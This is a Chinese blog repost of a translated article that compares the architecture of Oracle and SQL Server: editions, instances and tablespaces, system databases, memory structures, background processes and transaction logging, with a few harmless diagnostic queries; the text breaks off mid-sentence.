<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>深度对比Oracle与SQL Server - 编程爱好者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="深度对比Oracle与SQL Server" />
<meta property="og:description" content="本译文采用知识共享署名-非商业性使用-相同方式共享 3.0 Unported许可协议发布，转载请保留此信息
译者：马齿苋 | 链接：http://www.dbabeta.com/2010/oracle-sql-server-comparison-i.html
作者：Sadequl Hussain | 原文：http://www.sql-server-performance.com/articles/dba/oracle_sql_server_comparison_p1.aspx
一般的公司通常会在他们的信息系统架构中引入多种数据库平台，同时引入三到四种不同的RDBMS解决方案的中大型公司也并不少见，当然这些公司里面的DBA们通常也需要同时拥有管理多种不同平台的技能了。
只在一种平台上展开工作的数据库专家们也通常会期待着在他们的下一份工作中能学到点不一样的东西，那些有勇气的人们则愿意花时间、金钱和精力去学习新的东西，也有其他因为换了新公司或者是为了找新的工作而去学习新的系统的人们，毋庸置疑的一点就是公司老板和人力专家们会更加青睐于那些拥有多个领域经验的求职者。
依我个人的经验来看，在学习一个新的数据平台的时候，最好的方法就是在新的环境中去发现那些你已知的东西，这样学习起来会简单很多。当然，当中也会遇到一些全新的概念需要去学习，或者是忘掉一些你现在已知的概念，但不管怎么说你不是从零开始的。比如说一个做SQL Server开发人员在要写Oracle存储过程的时候可能会先去找那些内置的函数然后比较它们之间不同点，她也可能会去比较变量声明以及错误处理的异同。
本系列文章中我将尝试对Microsoft SQL Server和Oracle RDBMS(以10g及以后的版本为主)进行一个深入的比较。我会主要集中于这两种数据库之间架构上的比较，当然不要期望我会给你一个详尽的比较清单，但是我会尽我所能的让你看清这两种当今世上应用最广的数据库之间的相同和相异之处。本文是以一个SQL Server DBA的角度去构思和写作的，不过相信这对Oracle专家门了解SQL Server这一面也是很有参考价值的。
废话少说，开工吧。
top操作系统的支持
Microsoft SQL Server向来都从属于Windows大家族中的一员，要让Microsoft发布一个支持其它操作系统版本的可能性当然是小之又小的了。当前来说 SQL Server可以在XP、Vista、Windows Server 2000、2003、2008上运行，同时也有针对于32位和64位版本Windows的数据库版本。
对Oracle来说，它支持多种不同的操作系统平台，包括Windows（32位和64位），另外还有支持Linux和不同分支的 Unix（Solaris、HP-UX、AIX等等）
top版本和发行版
在本写作时，Microsoft数据库产品的最新版本是SQL Server 2008，即将推出的下一版本是SQL Server 2008 R2，现在已经在CTP阶段了，它的上一个版本，SQL Server 2005，相对于再之前的SQL Server 2000的一个大升级。不过对很多公司来说SQL Server 2005还是有点新，因为他们现在还是在大量的使用着SQL Server 2000.
另一方面Oracle一路走来最新版本已经到了11gR2了，现在主流应用的版本10gR2已经发行有一段时间，已经是公认的领头羊了。 Oracle在10g中第一次提出“网格计算”的概念。当然现在还有公司依然在依赖于Oracle 9i处理业务。
说到发行版，SQL Server 2008 R2现在提供下面这么些版本：
企业版
企业版包含所有的高级特性，适用于大规模、高容量的数据库需求。
标准版
标准版为那些不需要包含企业版高级特性的公司提供了一个相对便宜的数据库平台，大部分公司使用的都是标准版的数据库。
工作组版
工作组版适用于小的部门级别的应用。
Web版
这个适用于作为Web应用的低成本的后台解决方案。
Express版
这是一个很小的内嵌式的SQL Server引擎，通常用于本地数据存储或是小规模的系统开发。Express版可以免费下载并且自由分发。
Compact版
Compact版可以让用户开发Windows桌面或者是手持设备的应用。
开发版
所有企业版所拥有的功能开发版都有，不过它仅仅授权单个用户访问，主要用于开发或是测试目的。" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bchobby.github.io/posts/a35bb6814e2243a675eb3801add18e71/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2019-10-22T13:44:06+08:00" />
<meta property="article:modified_time" content="2019-10-22T13:44:06+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程爱好者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程爱好者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">深度对比Oracle与SQL Server</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <p>本译文采用知识共享署名-非商业性使用-相同方式共享 3.0 Unported许可协议发布，转载请保留此信息<br> 译者：马齿苋 | 链接：http://www.dbabeta.com/2010/oracle-sql-server-comparison-i.html<br> 作者：Sadequl Hussain | 原文：http://www.sql-server-performance.com/articles/dba/oracle_sql_server_comparison_p1.aspx<br><br><br> 一般的公司通常会在他们的信息系统架构中引入多种数据库平台，同时引入三到四种不同的RDBMS解决方案的中大型公司也并不少见，当然这些公司里面的DBA们通常也需要同时拥有管理多种不同平台的技能了。<br><br> 只在一种平台上展开工作的数据库专家们也通常会期待着在他们的下一份工作中能学到点不一样的东西，那些有勇气的人们则愿意花时间、金钱和精力去学习新的东西，也有其他因为换了新公司或者是为了找新的工作而去学习新的系统的人们，毋庸置疑的一点就是公司老板和人力专家们会更加青睐于那些拥有多个领域经验的求职者。<br><br> 依我个人的经验来看，在学习一个新的数据平台的时候，最好的方法就是在新的环境中去发现那些你已知的东西，这样学习起来会简单很多。当然，当中也会遇到一些全新的概念需要去学习，或者是忘掉一些你现在已知的概念，但不管怎么说你不是从零开始的。比如说一个做SQL Server开发人员在要写Oracle存储过程的时候可能会先去找那些内置的函数然后比较它们之间不同点，她也可能会去比较变量声明以及错误处理的异同。<br><br> 本系列文章中我将尝试对Microsoft SQL Server和Oracle RDBMS(以10g及以后的版本为主)进行一个深入的比较。我会主要集中于这两种数据库之间架构上的比较，当然不要期望我会给你一个详尽的比较清单，但是我会尽我所能的让你看清这两种当今世上应用最广的数据库之间的相同和相异之处。本文是以一个SQL Server DBA的角度去构思和写作的，不过相信这对Oracle专家门了解SQL Server这一面也是很有参考价值的。<br><br> 废话少说，开工吧。<br><br><br> top操作系统的支持<br><br> Microsoft SQL Server向来都从属于Windows大家族中的一员，要让Microsoft发布一个支持其它操作系统版本的可能性当然是小之又小的了。当前来说 SQL Server可以在XP、Vista、Windows Server 2000、2003、2008上运行，同时也有针对于32位和64位版本Windows的数据库版本。<br><br> 对Oracle来说，它支持多种不同的操作系统平台，包括Windows（32位和64位），另外还有支持Linux和不同分支的 Unix（Solaris、HP-UX、AIX等等）<br><br> top版本和发行版<br><br> 在本写作时，Microsoft数据库产品的最新版本是SQL Server 2008，即将推出的下一版本是SQL Server 2008 R2，现在已经在CTP阶段了，它的上一个版本，SQL Server 2005，相对于再之前的SQL Server 2000的一个大升级。不过对很多公司来说SQL Server 2005还是有点新，因为他们现在还是在大量的使用着SQL Server 2000.<br><br> 另一方面Oracle一路走来最新版本已经到了11gR2了，现在主流应用的版本10gR2已经发行有一段时间，已经是公认的领头羊了。 Oracle在10g中第一次提出“网格计算”的概念。当然现在还有公司依然在依赖于Oracle 9i处理业务。<br><br> 说到发行版，SQL Server 2008 R2现在提供下面这么些版本：<br><br> 企业版<br>     企业版包含所有的高级特性，适用于大规模、高容量的数据库需求。<br> 标准版<br>     标准版为那些不需要包含企业版高级特性的公司提供了一个相对便宜的数据库平台，大部分公司使用的都是标准版的数据库。<br> 工作组版<br>     工作组版适用于小的部门级别的应用。<br> Web版<br>     这个适用于作为Web应用的低成本的后台解决方案。<br> Express版<br>     这是一个很小的内嵌式的SQL Server引擎，通常用于本地数据存储或是小规模的系统开发。Express版可以免费下载并且自由分发。<br> Compact版<br>     Compact版可以让用户开发Windows桌面或者是手持设备的应用。<br> 开发版<br>     所有企业版所拥有的功能开发版都有，不过它仅仅授权单个用户访问，主要用于开发或是测试目的。<br><br> 除了企业版，SQL Server 2008 R2还为数据中心和数据仓库提供两个“白金版”，这两个版本分别称为数据中心版 (Datacenter Edition)和并行数据仓库版(Parallel Data Warehouse Edition)。<br><br> 对于Oracle 11g R2，发行版是这么样的：<br><br> 企业版<br>     这个版本提供了顶级的性能，同时价钱也是顶级的。像SQL Server的企业版一样，所有这个产品能提供的特性在这个版本里面都有。<br> 标准版<br>     这个和SQL Server标准版很像，Oracle标准版包含了大部分业务应用所需要的大部分特性。<br> 标准版1<br>     这个版本为小型工作组应用而设计，授权最小的用户为5。<br> Express版<br>     这个目标客户是小规模应用或者是数据库开发入门，可以免费分发。现在Express版还处于10g R2版本。<br><br> 下表提供了SQL Server和Oracle数据库发行版的直观的对比：<br> SQL Server  Oracle<br> Enterprise Edition  Enterprise Edition<br> Standard Edition  Standard Edition<br> Workgroup Edition  Standard Edition One<br> Express edition  Express Edition<br> Web Edition  X<br> Compact Edition  X<br> Developer Edition  Enterprise Edition<br><br> top实例、数据库和表空间<br><br> SQL Server和Oracle之间第一个架构级别的差异就在于对实例 (instance)和数据库(database)概念的定义了。<br><br> SQL Server中，实例一词用来代表一个包含了操作系统文件、内存结构、后台进程以及注册表信息的独立的应用服务。在Windows系统中用一个存在着停止和运行状态的服务来代表一个实例，当处于运行状态时，实例要占用一定的服务器内存以及生成一定数量的后台进程。<br><br> SQL Server实例的中心是数据库。一个SQL Server数据库指的是一个资料库以及操作数据所需要的程序代码，当实例没有运行时，实例中的数据库就不能够访问。<br><br> SQL Server有两种数据库：系统数据库(system databases)和用户数据库(user databases)。在一个SQL Server实例安装完成之后，将会自动创建5个系统数据库：master, model, msdb, tempdb和resource。如果一个机器上面安装了多个SQL Server实例时，没有实例都会有自己单独的一套系统数据库。除了msdb数据库之外，其它数据库不能访问或是被损坏都会导致实例无法启动。相比之下用户数据库由DBA或者是开发人员在数据库实例安装完毕、系统数据库都启动之后所创建的，这些数据库中保存着公司的业务资料。<br><br> 简而言之，一个SQL Server实例总是要包含一些数据库（尽管有时只是那些系统数据库），一个数据库也总是要有一个（且仅有一个）与之关联的实例。<br><br> 从物理角度说，一个SQL Server数据库表现为存储于磁盘上面的一组操作系统文件的集合。数据库文件分为两种：数据文件 (data file)和事务日志文件(transaction log file)。一个数据库至少要包含一个数据文件和一个事务日志文件，SQL Server数据库的资料主要是存在于数据文件中，事务日志文件用来记录发生在这些数据上面的变更记录，SQL Server在执行系统恢复的时候要用到它。一个数据文件或事务日志文件只能隶属于一个特定的数据库，不存在两个数据库共用一个数据文件或者是日志文件的情况。一个数据量很大的数据库可以使用多个数据文件，这些数据文件能够被逻辑的组合成一个称为文件组(file group)的逻辑组。<br><br> 在Oracle中，这一切看起来都有点反着来了。当Oracle启动时，它和SQL Server一样要先占用一些服务器内存用于执行操作，这个内存区域——著名的SGA(System Global Area)—— 被分为数个不同的结构，在创建SGA的同时也会启动一系列的后台进程用于和SGA进行交互，在这里这些分配的内存空间和后台进程组合起来就是Oracle实例了。请注意现在我们没有见到数据库的影子还，实际上 Oracle实例在没有数据库或是数据库不能访问时也是跑的很好的，在安装Oracle时，我们可以选择只安装软件，完了之后再安装数据库。<br><br> Oracle中的数据包含了一组操作系统文件。不像SQL Server数据库，Oracle数据库并不能代表数据库对象的逻辑分组，它更像是表示包含多个存在于磁盘上的用来保存数据的文件的一个单个的集合名词。<br><br> 组成Oracle数据库的文件可以分成三个类型：数据文件(data file)、重做日志文件(redo log file)和控制文件(control file)。数据文件保存数据，Oracle中可以存在任意数量的数据文件；重做日志文件跟SQL Server的事务日志文件一样用来保存对数据更改的记录，在系统恢复阶段需要用到；控制文件是一些特别的小文件，用来保存一些至关重要的关于数据库的信息，没有这个文件的话，实例就无法打开数据库。<br><br> 除了数据文件、重做日志文件、控制文件之外，数据库还包含参数文件(parameter file)、密码文件(password file)和可选的归档日志文件(archive log files)，后面很快会对这些文件类型展开讨论。<br><br> Oracle系统启动时，首先在内存中创建数据库实例，然后由实例找到保存在磁盘中的数据库，最后打开数据库让用户操作。当系统关闭时，实例会从内存中清除掉：整个内存结构和后台进程都会消失，但是数据库依然存在于磁盘上，只是处于关闭的状态。之前也说过，Oracle实例可以在不打开数据库的情况下运行——这是与SQL Server数据库最大的不同，SQL Server实例是不能够离开系统数据库而运行的。不过和SQL Server一样Oracle数据库在实例没有启动的情况下也是不能访问的。<br><br> 一般来说Oracle实例和数据库之间是一对一的关系。一个实例对应着一个数据库，但是一个数据库却可以同时由多个实例去访问它。一个独立的 Oracle安装包含一个实例和一个供实例操作的数据库，而配置成RAC(Real Application Cluster)的安装则可以允许多个存在于不同机器上的实例访问存在于一个共享磁盘上面的数据库。<br><br> 那Oracle中数据库对象的逻辑分组在那儿呢？在SQL Server中逻辑分组由数据库自己来完成，而在Oracle中，这项工作由表空间(tablespace)完成，Oracle表空间是用来对表、视图、索引和其他数据库对象进行分组的逻辑结构。例如，你的 Oracle产品库可以给HR应用一个单独的表空间，支付应用则使用另外一个。一个数据库可以逻辑的分成若干个表空间，这些表空间在物理上则由一个或者多个数据文件组成。因此在Oracle中与SQL Server数据库等价的是表空间。<br><br> 由于这两种结构在功能上相当类似，在SQL Server中建立数据库的过程和在Oracle中建立表空间的过程也非常相似。不管是建立数据库还是表空间，DBA都要首先指定一个名字，然后给新建的数据库或者表空间分配一个或多个数据文件，并为每个数据文件指定初始大小和数据增长情况。<br><br> 在SQL Server中可以做到让一个用户数据库离线或是只读，Oracle的用户表空间也一样可以。在SQL Server中可以让一个用户数据库中的一个或者多个数据文件只读，而Oracle用户表空间中的一个或者多个数据文件也同样能标记为离线。<br><br> 不过数据库和表空间在某些方面还是有差别的：<br><br>     * SQL Server中，数据文件可以用文件组逻辑的进行分组，而Oracle表空间就没有类似的概念。<br>     * SQL Server的每个数据库都有自己的事务日志文件，而且在创建数据库的时候就要指定这些日志文件的属性。而在Oracle中整个数据库（意为所有的表空间）的事务日志都是记录在同样的一样重做日志中，因此也不存在说给每个表空间建立一个单独的日志文件的说法。<br>     * SQL Server中，数据库可以设置成简单恢复模式(simple recovery mode)，简单恢复模式指的是活动的数据库日志在checkpoint操作完成之后就会截断。Oracle也有类似的概念，这个稍后会说到，不过不能在表空间级别上进行这样的设置。<br><br><br> top实例名和SID<br><br> SQL Server和Oracle都允许在同一个机器上面同时运行多个实例，多个实例的执行环境是完全独立的：就单个的数据库引擎而言，它并不知道也不关心有没有其他的实例在这个机器上运行着。<br><br> 在SQL Server中这种机制通过实例这个概念来实现，SQL Server可以作为一个命名的(named) 或是 默认(default) 的实例来运行，默认实例的名字和运行它的Windows服务器的名字一样，显然一个系统的默认实例只可能存在一个，不过在一个机器上可以存在多个命名的实例，命令实例的名字格式为 HOSTNAME\INSTANCE_NAME ，同一个主机上每个运行实例的 INSTANCE_NAME 必须是唯一的，每个实例都有着自己的一套程序文件以及一些与其它实例共享的通用组件。<br><br> 而Oracle也差不多，在安装Oracle的时候，DBA就需要指定一个 全局数据库名(Global Database Name)和系统标识符 (SID, System Identifier)。Oracle中实例和数据库是完全不同的东西，一个全局数据库名用来在网络上唯一的识别一个数据库的存放位置，一个完整的名字通常是下面的格式database_name.network_domain_name。 SID则是用来识别一个与数据库关联的实例，大都数情况下一个实例关联一个单个的数据库，数据库名和SID名字会是一样。RAC环境中就不一样了，RAC 允许多个实例访问放在共享存储中的同一个数据库，此时的实例名和数据库名字将不一样。当然和SQL Server一样，一个Oracle数据库服务器上面是不允许两个实例使用同一个SID的，另外一点类似的就是在安装时一旦指定，不管是SQL Server实例名还是Oracle SID都是不能再修改了。<br><br> SQL Server DBA可以通过下面的语句查询当前登录系统的实例名：<br> 查看源代码<br> 打印帮助<br> 1 SELECT @@SERVERNAME<br><br> Oracle DBA用来查询实例名和数据名的语句如下：<br> 查看源代码<br> 打印帮助<br> 1 SELECT INSTANCE_NAME, HOST_NAME, VERSION, DATABASE_STATUS FROM V$INSTANCE;<br> 2 SELECT NAME, DATABASE_ROLE, CREATED FROM V$DATABASE;<br><br> top系统数据库和系统表空间<br><br> 一个SQL Server实例需要有5个系统数据库（2005之前的是4个）：master, model, msdb, tempdb和resource，一个Oracle数据库则最少需要3个系统表空间才能正常操作，它们是：SYSTEM, SYSAUX和TEMP。<br><br> master和resource数据库集中保存了SQL Server自身管理所需要的所有信息，里面保存了诸如系统配置，数据库列表和文件路径、终结点、连接服务器和用户帐户（或“登录”信息），系统级别的对象存储在只读的数据库”资源(resource)”中。<br><br> 在Oracle中，SYSTEM表空间等价于master数据库，SYSTEM表空间包含了数据字典(data dictionary)，也就是关于Oracle自身的元数据(metadata)，这里的数据字典可以和SQL Server中的resource数据库进行类比。到这里你也许猜到了：如果SYSTEM不存在或是损坏了的话Oracle数据库是打不开的。<br><br> 对于一个SQL Server实例，model数据库用作这个实例中所有新建的数据库的“模板”，对model数据库的任何修改都会反应到之后新建的其它数据库里面。在 Oracle中就没有这样的模板，不过在你新建一个表空间的时候，你可以指定这是一个永久的表空间或者是其他类似TEMP和UNDO一样的表空间，永久表空间才是用来保存用户数据的。<br><br> SQL Server的tempdb用作整个实例的“试验田”，每次实例重新启动的时候tempdb都会重新创建。Oracle的TEMP表空间的作用类似：用来包括大的排序操作的中间结果。当然SQL Server的tempdb还能用来保存行版本(row versioning)所需要的信息，当行版本启用后，行版本特性可以保证数据库引擎能将数据行的每次的修改记录保留下来，修改之前的行会保存在tempdb里面的版本库中，一般查询会返回一个数据行上最后提交的版本，当一个使用了特定隔离级别的依赖行版本的读操作不再会阻塞其它修改同样数据的事务，这是因为读操作不会在数据行上使用共享锁。不过这个特性需要在单个数据库上单独启用。<br><br> Oracle中使用一个单独的表空间——著名的UNDO表空间——来达成同样目的。UNDO表空间保存着被DML语句修改的数据块的读一致性的副本。当用户开始对数据进行修改的时候，修改之前的数据块会被保存到UNDO表空间中，当另外一个用户需要查询这些数据的时候，他取到的实际上是UNDO表空间中查出来的读一致性的版本。不像SQL Server的行版本，Oracle的UNDO不需要启用——因为它是属于Oracle并行访问机制的一部分。<br><br> 最后一个要介绍的SQL Server中的msdb数据库，SQL Server代理服务需要操作这个库。SQL Server代理负责计划任务、警告、复制、日志传送以及其它的很多东西，代理服务的正常运行离不开msdb数据库。</p> 
<p> </p> 
<p>数据库实例结构<br><br> 当Oracle实例启动之后，所看到的就是在服务器内存上的一个个不同内存块加上产生的与这些内存交互的后台进程。 Oracle文档将这些内存结构和进程收的很详细。<br><br> 由Oracle实例所占用的内存块成为SGA(System Global Area)，它的大小可以通过调整 Oracle初始化参数(initialisation parameter)进行修改，在SGA里边至少会创建3个不同的区域，它们分别是：<br><br> 数据块缓存区(Database Buffer Cache)<br>     这里缓存的是数据块。和SQL Server一样，用户不会直接的访问数据文件上的数据：当读取数据时，相关的数据块会从数据文件中拷贝到内存中；修改数据时也是修改内存中的数据，然后再由单独的进程将数据缓存区中被修改的数据写入到数据库中。<br> 重做日志缓存(Redo Log Buffer)<br>     SGA中的这个区域连续的记录着数据缓存区数据修改的记录，重做日志缓存中的内容会被写入到在线日志文件中去。<br> 共享池(Shared Pool)<br>     SGA中有一大块的内存用作共享池，共享池等价于SQL Server中的执行缓存(Procedure Cache)。它的主要作用就是缓存数据库中最近执行过的SQL语句。共享池由下面的模块组成：<br><br>     数据字典缓存(Dictionary Cache)<br>         数据字典缓存缓存了Oracle最近使用的数据字典信息。<br>     库缓存(Library Cache)<br>         这个区域包含了最近执行的SQL和PL/SQL语句和对应的执行计划。SQL区还能进一步分成共享区和私有区：共享SQL区保存的语句可以由多个用户使用而私有区保存的则是跟各个连接对应的绑定变量的信息。PL/SQL是Oracle对于行业标准SQL的程序扩展，当PL/SQL程序执行时，它的代码会拷贝到库缓存中的共享PL/SQL区中。除了缓存执行代码和执行计划外，库缓存还包含锁、阀以及字符集等信息。<br><br> 根据你所使用的组件的不一样，Oracle的SGA中也可能存在其它一些可选的内存区域。在Oracle中使用Java应用时要使用到Java池 (Java Pool)，Oracle内置的备份恢复工具RMAN(Recovery Manager)要用到大池(Large Pool)，当使用Oracle高级队列机制时要用到流池(Steams Pool)。<br><br> 上面介绍的各个内存区域都是属于SGA的一部分，它们是通过一序列的进程 (process)来和数据库进行交互。下面就开始介绍包括用户进程和服务器进程在内的Oracle进程了。<br><br> 当用户或者是应用连接到Oracle数据库时就会产生一个用户进程(user process)。在一个两层的系统架构中，用户进程存在于客户端机器上；而在一个三层的系统架构中，用户进程由中间层产生。一旦用户进程连接到Oracle监听服务 (Listener Service)时，监听器就会为这个用户会话产生一个服务器进程(server process)。再说详细点就是，Oracle监听器是一个负责为Oracle处理近来连接的网络组件，监听器本身是一个单独的进程，负责监视着从客户端过来的连接请求，如果监听器没有运行的话，数据库也就无法连接了。一旦连接建立，由监听器产生的服务器进程就开始接手处理用户操作数据库的请求了。大多情况下每个用户连接会产生一个独立的服务器进程，不过Oracle也能配置成一个运行着多个预先创建好的服务器进程池的模式，此时用户进程连接到数据库实例之后将会直接从进程池中分配一个进程。<br><br> 任何时候Oracle实例中都会有多个后台进程在运行着，不过，有5个必须要有的。<br><br> 写数据库(Database Writer)进程或称DBWn负责将数据缓存区中被修改的数据库写入到数据文件中。为提高系统系能Oracle可以最多创建20个这样的进程，DBWn中的n代表着一个单独的进程：n取值范围是0 到9和a到j。<br><br> 在DBWn进程将脏块写入到数据文件的同时，一个叫日志写入(Log Writer, LGWR)的进程也在降日志缓存中的日志写入到在线日志中去。LGWR执行的要比DBWn进程频繁得多，主要原因有两点：首先是要尽快的将事务信息写入到磁盘当中，以保证当意外宕机等事件发生时数据库能正常恢复，在一个就是日志缓存中的日志信息记录的不是实际的变化的数据，但是却是能够反应数据的变化——因此相比之下也就要小得多了。<br><br> 检查点(Checkpoint, CKPT)进程负责定期的将SGA中的内容同步到数据库中。当执行检查点时，它会调用DBWn进程将所有的脏块写入到数据文件中，同时将重做日志缓存中的内容写入到在线日志文件中，然后更新数据文件头和控制文件的相关信息。<br><br> 如果某个访问数据库的进程意外的死掉的话，那进程监视器(Process Monitor, PMON)就会在后台悄悄的清理掉这个死掉的进程，所进行的操作包括释放相应的锁、回收分配的资源已经将这个进程从活动进程中清理出去。PMON进程有点像一个UNIX的 daemon进程：它会定期的唤醒以检查看是否有清理工作要做。在必要的时候也能启动一个别的进程或被其他的后台进程使唤。<br><br> 在一个实例崩溃之后重启时，Oracle会自动的调用系统监视器(System Monitor, SMON)进程，SMON会利用在线日志文件来完成崩溃恢复操作。<br><br> 归档进程(Archiver, ARCn)是Oracle实例中可选的几种进程之一，这里的n和之前说的一样都是代表着单个的进程。只有在数据库开启了归档模式(archive log mode)之后才会启动ARCn进程，在在线日志中的内容满了之后，在Oracle覆盖这些记录之前ARCn进程会将这些内存保存到磁盘上，这些文件称为归档日志 (archive log)，这样的话在线日志内容就不会丢掉了。<br><br> 下图显示的是Oracle实例结构的一个简化版。<br><br> 最后，你可以通过下面语句来查看SGA各个组件的情况：<br> 1 SELECT * FROM V$SGAINFO<br><br> 下面的命令用来查看分配给Oracle实例的总内存数：<br> 1 SHOW PARAMETER SGA_MAX_SIZE;<br><br> 要查看一个实例上运行的Oracle进程情况可以使用下面的语句：<br> 1 SELECT NAME, DESCRIPTION FROM V$BGPROCESS ORDER BY NAME<br><br> 在一个运行着的Microsoft SQL Server实例上，同样维护者一些内部的内存结构和后台进程，不过不像Oracle那样，SQL Server并没有公开的详细解释内部工作和架构的文档。<br><br> 自2005版以后，SQL Server引入了一个叫SQLOS(SQL Operating System)的东西，不过跟名字所显示的不一样的是，这个东西既不是一个操作系统，也不是对于OS API的一个封装。它并不是一个通向非Windows平台的桥梁或是一个用于框架开发的类库。<br><br> SQLOS是一套用于通过优化与Windows系统接口而为SQL Server存储和数据库引擎提供关键服务的软件，Windows是一个通用的OS：它并没有为SQL Server而做特别的优化。SQLOS则担当替代Windows而为SQL Server和管理核心系统服务的，SQLOS提供的服务包括：<br><br>     * 内存管理<br>     * 资源管理<br>     * 检测和管理死锁<br>     * 异常处理<br>     * CLR组件托管<br>     * 包括专用管理连接(Dedicated Administrator Connection, DAC)和动态管理视图(Dynamic Management Views, DMV)在内的诊断功能<br>     * 调度管理（马上开讲）<br><br> Windows下的应用程序都是运行在独立的、受保护的内存空间上，这些内存空间被称为虚拟地址空间(Virtual Address Spaces, VAS)。因为每个应用的VAS都是不一样的，因此一个应用是不能往另外一个应用的地址空间做写入操作的，这样保证了程序不会因为严重的违规访问而崩溃。分配给应用的VAS可能来自于物理内存或者是页面文件，又或者是两者都有。页面文件 (paging file)又称交换文件(swap file)是一个被Windows内存管理器用来存放那些无法放进物理内存的数据的，这些数据被写入到交换文件中，在应用需要的时候被读取出来。当中所涉及到的虚拟内存地址与物理内存地址之间的转换（在RAM和页面文件中）时由Windows内存管理器完成。从应用的角度来说，它并不关心它的内存究竟是存在什么地方的。对32位的Windows系统，OS所能寻址的最大的VAS地址空间是4GB，默认情况下这当中的2G供操作系统内核使用，剩下的2G提供给像SQL Server之类的应用使用。不过通过修改boot.ini中的开关（3G开关）设置可以让Windows只给自己分配1G而剩下3G给应用使用。要想在32位的机器上使用超过4GB内存的话，SQL Server可以通过地址窗口化扩展插件 (Adress Windowing Extension, AWE)机制利用超出限制的内存。在64位的系统上面Windows的内存寻址通常就不是个问题了，因为此时的Windows可寻址的VAS空间达16TB。<br><br> 作为同样是Windows应用的SQL Server，自然也是无法独立于VAS规则之外的了。当SQL Server启动之后，数据库引擎就只能看到自己的VAS空间，缓存池(buffer pool)也就放在这个空间里面。缓存池缓存的是SQL Server数据：它由8KB大小缓存组成，缓存了来自数据文件的数据页，这个类似于Oracle的数据块缓存区。在VAS中的数据库引擎由 SQLSERVER.EXE程序，各个DLL库以及线程结构组成。<br><br> 缓存池的大小受限于两个组件：机器可用的物理内存和SQL能访问的VAS。为避免缓存池无限扩展最终会吃掉所有的VAS而导致SQL Server意外死掉，SQL Server会让缓存池留下一部分VAS内存作为“保留区”。另外SQLOS内存管理器还保证缓存池可以满足其他SQL Server内部组件需要：缓存池中的内存页可以用来缓存连接数据、SQL优化器数据、还要做最重要的执行缓存之用。因为分配给这些组件的内存是不能再用作存储数据了，因此这些页又叫做被盗用页(stolen pages)。<br><br> 下图简要的展示了SQL Server VAS的各个组件。<br><br> 前面提到的资源监视器(resource monitor)属于SQLOS的一个组件。资源监视器的工作之一就是检查和监听操作系统发出的低内存通知，当资源监视器检测到低内存情况时，它会将这一情况记录到一个称为环缓冲区(Ring Buffer)的结构中，然后再将这个信息广播给SQL Server引擎，这样所有SQL相关的组件接到广播之后能减少它们的内存使用。SQLOS的内存管理器(Memory Manager)组件也同样会监视可用的虚拟内存和物理内存以及通过一个叫内存专员(memory clerk)的通知机制对内存压力做出响应。<br><br> 在涉及到任务执行（查询编译、执行等等）的时候，SQLOS使用到一个叫做调度器的机制。调度器(scheduler)可以看成是SQL Server对于每个单个CPU的抽象表示，举个例子来说，一个运行SQL Server的机器有2颗4核的CPU的话那就能看到8个调度器。每个调度器都会和一定数量的工作线程(worker thread)相关联。例如在数据库上面执行的一个查询任务，这个任务会被分割成解析、编译、生成执行计划等一序列的子任务，每个这样的子任务都会由不同的线程来执行。<br><br> 当SQL Server启动的时候，只会启动有限数量的线程。线程的总数取决于运行SQL Server的机器的CPU数量以及架构（x86还是x64）。一个少于4个CPU的x86系统，所创建的线程数量为256；超过4个CPU之后每个增加的CPU会多创建8个线程。对于少于4个CPU的x64系统，初始线程数量为512；超过4个CPU之后每个增加的CPU会多创建16个线程。也就是说机器的CPU越强大，SQL Server创建的线程就会越多。<br><br> 当用户连接到SQL Server系统执行任务时，每个任务都会被分配给一个调度器。在SQL Server 2005之前，任务是按照轮流的方式分配的。自SQL Server 2005开始，任务分配则由SQLOS执行：任务会分配给最闲的调度器。<br><br> 和Oracle一样，在SQL Server也是可以查看那些运行中的后台进程的。只要在数据库实例上执行sp_who2命令就可以看到那些后台运行的进程了。<br><br> 当中的CHECKPOINT进程看名字就知道什么意思了。LOG WRITER进程等价于Oracle的LGWR进程：它负责将数据库的变化写到事务日志中。LAZY WRITER进程等价于 Oracle的DBWn进程：它的任务是将数据页的更改从缓存池中写入到数据文件中。有一点和Oracle不同的时候，在这里只有一个lazy writer进程负责写数据文件。其它还有一些后台进程是和SQLOS关联的：scheduler monitor，deadlock monitor和resource monitor等等。<br><br> top事务一致性(Transactional Consistency)和基于时间点的恢复(Point-in-time Recovery)<br><br> Microsoft SQL Server和Oracle一样内置都有针对于事务的保护机制。事务一致性的基本思想就是对于数据的更改不会马上反映到磁盘的文件当中，实际上这两者更新的都是被称为数据缓冲区(buffer cache)的内存区，同时还在一个称为日志缓存(log buffer)的内存中连续的记录对于数据所做的更改，这些内存区域的内容被不断的写入到磁盘文件当中。用于将数据缓存区和日志缓存区中的内容写入到磁盘文件当中的进程是两个不同的进程，不过将日志缓存的写入磁盘要比将数据缓冲写入磁盘要频繁的多了。<br><br> 现在当用户成功的提交一个事务时，他所做的更改并不会马上写入到数据文件中。不过这些变更会被记录到日志缓冲中，同时在发送提交成功的信息给用户之前这些相应的日志缓存数据会被写入到磁盘文件当中。<br><br> 正如之前所述，SQL Server将日志文件称为事务日志(Transaction Log)，Oracle 则称为重做日志(Redo Log)。在SQL Server术语中，保存数据更改记录的内存块称为日志缓存(Log Buffer)，Oracle则称为重做缓存(Redo 